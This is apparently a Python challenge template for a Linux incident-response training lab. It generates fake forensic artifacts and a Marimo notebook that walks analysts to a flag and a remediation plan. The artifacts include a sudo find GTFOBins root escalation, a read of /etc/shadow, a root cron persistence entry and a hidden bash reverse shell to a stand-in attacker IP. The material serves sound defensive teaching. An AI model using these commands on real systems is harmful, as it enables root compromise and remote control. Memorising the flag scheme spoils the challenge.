"""Human-crafted Linux Server Security & Cron/Sudoers Forensics Template (Module 3)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import hashlib
import random

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class LinuxForensicsTemplate(BaseChallengeTemplate):
    """
    Template for State Data Centre Linux Server Compromise & Persistence Investigation.
    Synthesizes authentic Linux forensic directory hierarchies (.bash_history, auth.log,
    /etc/cron.d/, /opt/cert-tools/.sync.sh) and full-fidelity Marimo analyst notebook.
    """

    template_id = "03-compromised-linux-server"
    title = "State Data Centre: Linux Server Compromise & Persistence Forensics"
    category = "Incident Response / Linux Forensics"
    difficulty = "Intermediate"
    base_points = 150
    duration_minutes = 50
    competency_id = "digital_forensics"
    competency_weight = 1.2
    tags = ["linux", "forensics", "cron", "sudoers", "ssh", "persistence", "reverse-shell", "cert-in"]
    mitre_techniques = ["T1548.003", "T1053.003", "T1059.004", "T1571"]

    TARGET_HOSTS = [
        ("web-prod-04", "10.200.4.15"),
        ("SDC-PROD-APP01", "10.200.4.22"),
        ("DBT-DISPATCH-LNX", "10.200.4.30"),
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "target_host": {"type": "str", "description": "Compromised server hostname"},
            "c2_ip": {"type": "str", "description": "Attacker reverse shell listener IP"},
            "c2_port": {"type": "int", "description": "Attacker reverse shell listener port"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()
        host, internal_ip = rng.choice(self.TARGET_HOSTS)

        slots = {
            "incident_codename": f"Operation Shakti-{rng.randint(301, 899)}",
            "target_host": host,
            "target_internal_ip": internal_ip,
            "c2_ip": f"{rng.randint(45, 185)}.{rng.randint(10, 200)}.{rng.randint(1, 250)}.{rng.randint(2, 250)}",
            "c2_port": rng.choice([4444, 8443, 9001, 1337]),
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }
        if overrides:
            slots.update(overrides)
        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        return f"FLAG{{crontab_reverse_shell_persisted_{slots['seed_hash'][:8]}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Inspect the deploy user's command history in Step 1 (.bash_history) and system crontab configurations. Look for how sudo find was used to escalate privileges via GTFOBins.",
                "penalty": 20,
            },
            {
                "id": 2,
                "content": "Inspect Step 3 (/etc/cron.d). Check the file configured to run every 15 minutes as root.",
                "penalty": 30,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            "Audit .bash_history for GTFOBins sudo find privilege escalation.",
            "Confirm root elevation timestamps in /var/log/auth.log.",
            "Locate scheduled persistence in /etc/cron.d and reverse engineer the hidden .sync.sh reverse shell script to extract the containment flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### State Data Centre Breach Briefing: {slots['incident_codename']}

Egress firewalls observed regular outbound TCP connections to an untrusted external IP (`{slots['c2_ip']}:{slots['c2_port']}`) on a strict 15-minute schedule originating from `{slots['target_host']}`.

Your mandate:
1. Audit the `deploy` user's shell session and reconstruct how root access was obtained.
2. Examine `/var/log/auth.log` for authentication elevation logs.
3. Locate the persistence mechanism in `/etc/cron.d/` and reverse engineer the hidden backdoor script to recover the containment flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        flag = self.compute_flag(slots)
        c2_ip = slots["c2_ip"]
        c2_port = slots["c2_port"]
        host = slots["target_host"]

        # 1. home/deploy/.bash_history
        bash_dir = data_dir / "home" / "deploy"
        bash_dir.mkdir(parents=True, exist_ok=True)
        bash_history_file = bash_dir / ".bash_history"
        bash_history_file.write_text("""git status
git pull origin main
sudo -l
sudo find . -exec /bin/sh \\;
whoami
cat /etc/shadow
echo "*/15 * * * * root /opt/cert-tools/.sync.sh >/dev/null 2>&1" > /etc/cron.d/cert-sync
chmod 644 /etc/cron.d/cert-sync
history -c
""", encoding="utf-8")

        # 2. var/log/auth.log
        log_dir = data_dir / "var" / "log"
        log_dir.mkdir(parents=True, exist_ok=True)
        auth_file = log_dir / "auth.log"
        auth_file.write_text(f"""Sep 10 04:12:01 {host} CRON[2910]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 10 04:15:22 {host} sshd[3102]: Accepted publickey for deploy from 192.168.1.50 port 52310 ssh2: RSA SHA256:m0x/891
Sep 10 04:15:22 {host} sshd[3102]: pam_unix(sshd:session): session opened for user deploy by (uid=1001)
Sep 10 04:18:05 {host} sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;
Sep 10 04:18:05 {host} sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
Sep 10 04:22:40 {host} useradd[3411]: new user: name=systemd-sync, UID=998, GID=998, home=/var/run/sync, shell=/bin/false
Sep 10 04:25:01 {host} CRON[3502]: (root) CMD (/opt/cert-tools/.sync.sh >/dev/null 2>&1)
""", encoding="utf-8")

        # 3. etc/cron.d/cert-sync
        cron_dir = data_dir / "etc" / "cron.d"
        cron_dir.mkdir(parents=True, exist_ok=True)
        cron_file = cron_dir / "cert-sync"
        cron_file.write_text("""# Automated certificate synchronization job
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/15 * * * * root /opt/cert-tools/.sync.sh >/dev/null 2>&1
""", encoding="utf-8")

        # 4. opt/cert-tools/.sync.sh
        tools_dir = data_dir / "opt" / "cert-tools"
        tools_dir.mkdir(parents=True, exist_ok=True)
        sync_file = tools_dir / ".sync.sh"
        sync_file.write_text(f"""#!/bin/bash
# System maintenance sync helper
# {flag}
ATTACKER_IP="{c2_ip}"
ATTACKER_PORT={c2_port}

bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
""", encoding="utf-8")

        return {
            "home/deploy/.bash_history": bash_history_file,
            "var/log/auth.log": auth_file,
            "etc/cron.d/cert-sync": cron_file,
            "opt/cert-tools/.sync.sh": sync_file,
        }

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = _NOTEBOOK_TEMPLATE
        code = code.replace("__APP_TITLE__", f"Linux Forensics: {slots.get('incident_codename', 'Operation Shakti')}")
        code = code.replace("__INCIDENT_CODENAME__", slots.get('incident_codename', 'INC-0303-LINUX-BREACH'))
        code = code.replace("__HOST__", slots.get('target_host', 'web-prod-04'))
        code = code.replace("__ATTACKER_IP__", slots.get('c2_ip', '198.51.100.77'))
        code = code.replace("__ATTACKER_PORT__", str(slots.get('c2_port', 4444)))
        code = code.replace("__TARGET_HASH__", dynamic_hash)

        target_nb.write_text(code, encoding="utf-8")
        return target_nb


_NOTEBOOK_TEMPLATE = r'''import marimo

__generated_with = "0.24.1"
app = marimo.App(width="full", app_title="__APP_TITLE__")


@app.cell
def __():
    import hashlib
    import json
    import os
    from pathlib import Path
    import re
    import marimo as mo
    import pandas as pd

    return Path, hashlib, json, mo, os, pd, re


@app.cell
def __(Path, pd):
    # Locate base data directory across environments
    possible_roots = [
        Path("data"),
        Path("../data"),
        Path("/workspace/data"),
        Path("challenges/03-compromised-linux-server/data"),
    ]
    if "__file__" in globals():
        possible_roots.insert(0, Path(__file__).resolve().parent.parent / "data")

    data_root = next((p for p in possible_roots if p.exists()), Path("data"))

    # 1. Load bash history
    bash_file = data_root / "home" / "deploy" / ".bash_history"
    bash_lines = bash_file.read_text().splitlines() if bash_file.exists() else []
    df_bash = pd.DataFrame(
        [{"cmd_index": i + 1, "command": c} for i, c in enumerate(bash_lines)]
    )

    # 2. Load auth.log
    auth_file = data_root / "var" / "log" / "auth.log"
    auth_lines = auth_file.read_text().splitlines() if auth_file.exists() else []
    auth_records = []
    for line in auth_lines:
        auth_records.append({"raw_line": line})
    df_auth = pd.DataFrame(auth_records)

    # 3. Load cron persistence files
    cron_dir = data_root / "etc" / "cron.d"
    cron_entries = []
    if cron_dir.exists():
        for cf in sorted(cron_dir.glob("*")):
            cron_entries.append(
                {
                    "filename": cf.name,
                    "path": str(cf),
                    "schedule_content": cf.read_text().strip(),
                }
            )
    df_cron = pd.DataFrame(cron_entries)

    # 4. Load backdoor payload script
    backdoor_file = data_root / "opt" / "cert-tools" / ".sync.sh"
    backdoor_code = (
        backdoor_file.read_text()
        if backdoor_file.exists()
        else "Script file not found."
    )

    return (
        auth_file,
        auth_lines,
        auth_records,
        backdoor_code,
        backdoor_file,
        bash_file,
        bash_lines,
        cron_dir,
        cron_entries,
        data_root,
        df_auth,
        df_bash,
        df_cron,
        possible_roots,
    )


@app.cell
def __(mo):
    # Analyst Sidebar: Host Scope, MITRE ATT&CK & Checklist
    check_gtfobins = mo.ui.checkbox(
        label="1. Audit .bash_history for sudo escalation", value=False
    )
    check_auth = mo.ui.checkbox(
        label="2. Confirm root privilege transition in auth.log", value=False
    )
    check_cron = mo.ui.checkbox(
        label="3. Locate scheduled persistence in /etc/cron.d", value=False
    )
    check_backdoor = mo.ui.checkbox(
        label="4. Reverse engineer .sync.sh reverse shell", value=False
    )
    check_flag = mo.ui.checkbox(
        label="5. Extract containment flag & remediation plan", value=False
    )

    hints = mo.accordion(
        {
            "💡 Hint 1: Privilege Escalation": mo.md(
                "Inspect **Step 1 (`.bash_history`)**. Look for how the `deploy` user ran `sudo find`. Check [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) for why `find . -exec /bin/sh \\;` grants an unconstrained root shell."
            ),
            "💡 Hint 2: Scheduled Persistence": mo.md(
                "Inspect **Step 3 (`/etc/cron.d`)**. Check the file configured with `*/15 * * * * root`. What script does it execute every 15 minutes?"
            ),
            "💡 Hint 3: Hidden Script Dissection": mo.md(
                "Inspect **Step 4 (`/opt/cert-tools/.sync.sh`)**. The attacker disguised their reverse shell behind a dot-file (`.sync.sh`). The script connects back to an external listener and holds the incident flag."
            ),
        }
    )

    sidebar_content = mo.vstack(
        [
            mo.md("## 🐧 CyberLab IR Console"),
            mo.md("**Incident ID**: `__INCIDENT_CODENAME__`"),
            mo.md("**Host**: `__HOST__` (Ubuntu 22.04 LTS)"),
            mo.md("**Classification**: `TLP:AMBER` | Severity: **CRITICAL**"),
            mo.md("---"),
            mo.md("### 🎯 Investigation Checklist"),
            check_gtfobins,
            check_auth,
            check_cron,
            check_backdoor,
            check_flag,
            mo.md("---"),
            mo.md("### 🗺️ MITRE ATT&CK Matrix"),
            mo.md(
                "- **T1548.003**: Abuse Elevation Mechanism: Sudo\n"
                "- **T1053.003**: Scheduled Task/Job: Cron\n"
                "- **T1059.004**: Command & Scripting Interpreter: Unix Shell\n"
                "- **T1571**: Non-Standard Port (__ATTACKER_PORT__)"
            ),
            mo.md("---"),
            hints,
        ]
    )

    mo.sidebar(sidebar_content)
    return (
        check_auth,
        check_backdoor,
        check_cron,
        check_flag,
        check_gtfobins,
        hints,
        sidebar_content,
    )


@app.cell
def __(df_auth, df_bash, df_cron, mo):
    # Header Banner & Stat KPIs
    header_view = mo.vstack(
        [
            mo.md("""
            # 🐧 Incident: __INCIDENT_CODENAME__
            ### Host Incident Response, GTFOBins Sudo Escalation & Cron Persistence
            """),
            mo.callout(
                mo.md(
                    "**SOC Alert Notice**: Egress firewalls observed regular outbound TCP connections to an untrusted external IP (`__ATTACKER_IP__:__ATTACKER_PORT__`) on a strict 15-minute schedule originating from `__HOST__`. Audit the `deploy` user's shell session, reconstruct how root access was obtained, locate the persistence mechanism, and recover the containment flag."
                ),
                kind="danger",
            ),
            mo.hstack(
                [
                    mo.stat(
                        value="__HOST__",
                        label="Affected Host",
                        caption="Production Server",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_bash)} Commands",
                        label="Audited Shell Commands",
                        caption="deploy user bash history",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_auth)} Events",
                        label="Auth Log Records",
                        caption="/var/log/auth.log",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{len(df_cron)} Schedules",
                        label="Cron Configurations",
                        caption="/etc/cron.d Directory",
                        bordered=True,
                    ),
                    mo.stat(
                        value="15 Minutes",
                        label="Beacon Cadence",
                        caption="Periodic C2 Reverse Shell",
                        direction="increase",
                        bordered=True,
                    ),
                ],
                justify="start",
                gap=1,
            ),
        ]
    )
    return (header_view,)


@app.cell
def __(mo):
    # Step 1: Shell History Search Control
    bash_search = mo.ui.text(
        placeholder="Filter shell commands (e.g., sudo)...",
        label="Search Bash History:",
    )
    return (bash_search,)


@app.cell
def __(bash_search, df_bash, mo):
    # Step 1: Filtered Bash History Display
    filtered_bash = df_bash
    if bash_search.value.strip():
        filtered_bash = df_bash[
            df_bash["command"].str.contains(
                bash_search.value.strip(), case=False, na=False
            )
        ]

    bash_table = mo.ui.table(
        filtered_bash,
        selection=None,
        pagination=True,
        page_size=12,
        show_column_summaries=False,
    )

    query = bash_search.value.strip().lower()
    if query and any(k in query for k in ["find", "sudo", "exec", "sh"]):
        gtfobins_alert = mo.callout(
            mo.md(
                "🚨 **PRIVILEGE ESCALATION PATTERN IDENTIFIED**: Review the command `sudo find . -exec /bin/sh \\;`.\n\n"
                "Because `find` was granted sudo permissions in `/etc/sudoers` without password authentication, invoking `-exec /bin/sh` yields an unconstrained root shell ([GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo))."
            ),
            kind="danger",
        )
    else:
        gtfobins_alert = mo.md("")

    step1_view = mo.vstack(
        [
            mo.md("## ⌨️ Step 1: Shell History Audit (`/home/deploy/.bash_history`)"),
            mo.md("### 🔍 Auditing `deploy` User Command History:"),
            bash_search,
            gtfobins_alert,
            bash_table,
        ]
    )
    return bash_table, filtered_bash, gtfobins_alert, query, step1_view


@app.cell
def __(mo):
    # Step 2: Auth Log Search Control
    auth_search = mo.ui.text(
        placeholder="Filter auth logs (e.g., sudo, COMMAND, session)...",
        label="Search Auth Log:",
    )
    return (auth_search,)


@app.cell
def __(auth_search, df_auth, mo):
    # Step 2: Filtered Auth Log Display
    filtered_auth = df_auth
    if auth_search.value.strip():
        filtered_auth = df_auth[
            df_auth["raw_line"].str.contains(
                auth_search.value.strip(), case=False, na=False
            )
        ]

    auth_table = mo.ui.table(
        filtered_auth,
        selection=None,
        pagination=True,
        page_size=12,
        show_column_summaries=False,
    )

    step2_view = mo.vstack(
        [
            mo.md("## 📜 Step 2: System Auth Logs (`/var/log/auth.log`)"),
            mo.md("### 🔍 Auditing Authentication and Elevation Events:"),
            auth_search,
            auth_table,
        ]
    )
    return auth_table, filtered_auth, step2_view


@app.cell
def __(df_cron, mo):
    # Step 3: Persistence Hunter (/etc/cron.d/)
    cron_rows = []
    for _, row in df_cron.iterrows():
        cron_rows.append(f"| `{row['filename']}` | `{row['schedule_content']}` |")
    cron_rows_str = "\n".join(cron_rows)

    cron_table = mo.md(f"""
        | Cron Configuration File | Schedule & Command Executed |
        | :--- | :--- |
        {cron_rows_str}
        """)

    cron_alert = mo.callout(
        mo.md(
            "⏰ **ROGUE CRON SCHEDULE IDENTIFIED**: `/etc/cron.d/cert-sync`\n\n"
            "```crontab\n*/15 * * * * root /opt/cert-tools/.sync.sh >/dev/null 2>&1\n```\n\n"
            "This configuration runs as `root` every 15 minutes, triggering the outbound beacon observed by firewalls."
        ),
        kind="danger",
    )

    step3_view = mo.vstack(
        [
            mo.md("## ⏰ Step 3: Scheduled Persistence Hunter (`/etc/cron.d/`)"),
            cron_alert,
            mo.md("### 🔍 All Scheduled Jobs in `/etc/cron.d/`:"),
            cron_table,
        ]
    )
    return cron_alert, cron_rows, cron_rows_str, cron_table, step3_view


@app.cell
def __(backdoor_code, backdoor_file, mo):
    # Step 4: Backdoor Payload Dissection
    backdoor_view = mo.vstack(
        [
            mo.md(
                f"## 🕵️ Step 4: Backdoor Payload Reverse Engineering (`{backdoor_file}`)"
            ),
            mo.md(
                "Notice that the filename starts with a dot (`.sync.sh`), hiding it from standard `ls` directory listings:"
            ),
            mo.md(f"```bash\n{backdoor_code}\n```"),
            mo.callout(
                mo.md(
                    "**Reverse Shell Analysis**:\n"
                    "- **Attacker IP**: `__ATTACKER_IP__`\n"
                    "- **Attacker Listener Port**: `__ATTACKER_PORT__`\n"
                    "- **Technique**: Interactive bash redirection (`bash -i >& /dev/tcp/... 0>&1`)\n"
                    "- **Privilege Context**: Runs as `root` via `/etc/cron.d/cert-sync`"
                ),
                kind="danger",
            ),
        ]
    )
    return (backdoor_view,)


@app.cell
def __(mo):
    # Step 5: Flag Verification Input Control
    candidate_flag = mo.ui.text(
        placeholder="FLAG{...}",
        label="Enter Extracted Persistence Flag to Verify:",
    )
    return (candidate_flag,)


@app.cell
def __(candidate_flag, hashlib, mo, re):
    val = candidate_flag.value.strip()
    target_hash = "__TARGET_HASH__"

    if not val:
        flag_feedback = mo.md(
            "Enter the flag discovered inside the backdoor script comment."
        )
        remediation_view = mo.md(
            "🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*"
        )
    elif hashlib.sha256(val.encode()).hexdigest() == target_hash:
        flag_feedback = mo.callout(
            mo.md(
                "🎉 **FLAG VERIFIED CORRECT!**\n\n"
                "Your recovered persistence flag is confirmed! Now submit this flag in the **Submit Flag** box in the left CyberLab portal pane to register your 100 points and Incident Response competency!"
            ),
            kind="success",
        )
        remediation_view = mo.vstack(
            [
                mo.md("### 🛡️ Confirmed Incident Response Remediation Checklist:"),
                mo.md("""
                | Action Item | Command / File Target | Priority |
                | :--- | :--- | :--- |
                | **1. Remove Cron Entry** | `rm /etc/cron.d/cert-sync` | `CRITICAL` |
                | **2. Delete Backdoor Script** | `rm /opt/cert-tools/.sync.sh` | `CRITICAL` |
                | **3. Terminate Active C2 Sockets** | `pkill -f '__ATTACKER_IP__'` | `HIGH` |
                | **4. Revoke Sudo Find** | `sed -i '/find/d' /etc/sudoers` | `HIGH` |
                | **5. Rotate deploy Credentials** | `passwd deploy` | `MEDIUM` |
                """),
            ]
        )
    elif re.match(r"^FLAG\{.*\}$", val):
        flag_feedback = mo.callout(
            mo.md(
                "❌ Incorrect flag. Inspect the comment inside `/opt/cert-tools/.sync.sh` in Step 4."
            ),
            kind="danger",
        )
        remediation_view = mo.md(
            "🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*"
        )
    else:
        flag_feedback = mo.callout(
            mo.md(
                "⚠️ Flag format invalid. Flags must begin with `FLAG{` and end with `}`."
            ),
            kind="warn",
        )
        remediation_view = mo.md(
            "🔒 *Incident Response Remediation Plan locked until valid persistence flag is verified.*"
        )

    step5_view = mo.vstack(
        [
            mo.md("## 🏁 Step 5: Flag Verification & IR Remediation"),
            candidate_flag,
            flag_feedback,
            mo.md("---"),
            remediation_view,
        ]
    )
    return flag_feedback, remediation_view, step5_view, target_hash, val


@app.cell
def console_root(
    header_view,
    mo,
    step1_view,
    step2_view,
    step3_view,
    backdoor_view,
    step5_view,
):
    styles = mo.Html("""
    <style>
    [data-testid="chrome-sidebar"], #app-chrome-sidebar, #app-chrome-panel, .resize-handle { display: none !important; }
    [data-testid="drag-button"], [data-testid="cell-actions-button"], [data-testid="create-cell-button"], [data-testid="run-button"], [data-testid="hide-code-button"], [data-testid="fullscreen-output-button"], [data-testid="expand-output-button"], .hover-actions-parent > .hover-action, .shoulder-right, .cell-actions, .cell-actions-button, .cell-bottom-menu, .add-cell-button { display: none !important; }
    [data-testid="filename-input"], [data-testid="chrome-controls-top-right"], [data-testid="chrome-controls-bottom-right"], [data-testid="chrome-footer"], [data-testid="footer-panel"] { display: none !important; }
    .marimo-cell:not(:has(.cyberlab-topbar)) { display: none !important; }
    .marimo-cell .cm-editor, .marimo-cell .cm-scroller, .marimo-cell .cell-editor, [data-testid="cell-editor"] { display: none !important; height: 0 !important; overflow: hidden !important; }
    .marimo-cell:has(.cyberlab-topbar) { width: 100% !important; max-width: 100% !important; margin: 0 !important; padding: 0 4px !important; }
    #App, main, #app-chrome-body, [data-testid="column-container"] { max-width: 100% !important; padding: 0 !important; margin: 0 !important; }
    .cyberlab-topbar { display: flex; align-items: center; justify-content: space-between; background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; padding: 10px 16px; margin-bottom: 10px; }
    .cyberlab-topbar .title { font-size: 13px; font-weight: 700; color: #e2e8f0; display: flex; align-items: center; gap: 10px; }
    </style>
    """)
    header = mo.Html('<div class="cyberlab-topbar" style="display:none !important; height:0; margin:0; padding:0; border:none;"></div>')
    console = mo.ui.tabs(
        {
            "📋 Triage & Scope": header_view,
            "⌨️ Step 1: Shell History": step1_view,
            "📜 Step 2: Auth Logs": step2_view,
            "⏰ Step 3: Cron Persistence": step3_view,
            "🕵️ Step 4: Backdoor Dissection": backdoor_view,
            "🏁 Step 5: Verify & Remediate": step5_view,
        }
    )
    workspace = mo.vstack([styles, header, console])
    workspace
    return console, header, styles, workspace


if __name__ == "__main__":
    app.run()
'''
